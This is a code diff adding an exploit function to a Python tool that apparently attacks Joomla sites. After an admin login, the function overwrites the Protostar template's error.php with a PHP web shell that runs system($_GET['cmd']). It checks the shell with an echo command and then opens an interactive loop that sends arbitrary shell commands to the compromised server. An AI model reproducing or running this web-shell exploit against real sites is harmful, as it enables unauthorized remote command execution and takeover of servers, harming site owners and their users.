@@ -57,6 +57,45 @@ def postLoginJoomla(user, password, url, hidden_values):
     print(f'[+] Status code: {response.status_code}')
     # Lunch
     putExploitJoomla(url)
+    
+# EXPLOIT JOOMLA
+## exploit on the protostar theme, needs to make it for the active one etc..
+def putExploitJoomla(url):
+    data = {
+        'jform%5Bsource%5D': '%3C%3Fphp%0D%0Asystem%28%24_GET%5B%27cmd%27%5D%29%3B%0D%0A%3F%3E',
+        'task': 'template.apply',
+        'jform%5Bextension_id%5D': '506',
+        'jform%5Bfilename%5D': 'error.php'
+    }
+    host = f"{url}/administrator/index.php?option=com_templates&view=template&id=506&file=L2Vycm9yLnBocA"
+    response = requests.post(host, data, allow_redirects=True)
+    print(response.status_code)
+    
+    print("[Exploit] Starting the exploit")
+    host = f"{url}/templates/protostar/error.php/error.php?cmd="
+    print(host)
+    cmd_echo = f"{host}echo%20%27HelloWorld%27"
+    print(cmd_echo)
+    response = requests.get(cmd_echo)
+    print(response.status_code)
+    print(response.content.decode('utf-8'))
+    
+    if "HelloWorld" in response.content.decode('utf-8'):
+        print("[+] Open input user, let's start hacking")
+        while True:
+            user_cmd = input("Enter a shell command (type 'exit' to quit): ")
+        
+            if user_cmd.lower() == 'exit':
+                break
+
+            new_url = f"{host}{user_cmd}"
+            response = requests.get(new_url)
+        
+            print(response.content.decode('utf-8'))
+    else:
+        print("[+] Can't open a webshell")
+
+        
 
 def main():
     parser = argparse.ArgumentParser(description='Jumbo loves to put some RCE in CMS')
